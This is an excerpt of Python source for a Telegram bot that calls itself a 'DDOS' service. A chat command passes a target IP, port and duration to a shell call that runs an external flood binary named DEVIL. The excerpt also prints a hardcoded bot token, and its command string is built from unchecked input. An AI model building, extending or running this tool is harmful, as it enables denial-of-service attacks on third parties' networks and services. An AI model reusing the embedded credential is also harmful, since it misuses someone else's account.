...
TOKEN = '7714977919:AAF4yfA3_rzq61Mgn-aFw-hXxlyctoAJrfc'
...
async def run_attack_command_async(chat_id, target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./DEVIL {target_ip} {target_port} {duration} 100")
...
def start_message(message):
    try:
        bot.send_message(message.chat.id, "*🌍 WELCOME TO DEVIL DDOS WORLD!* 🎉\n\n"
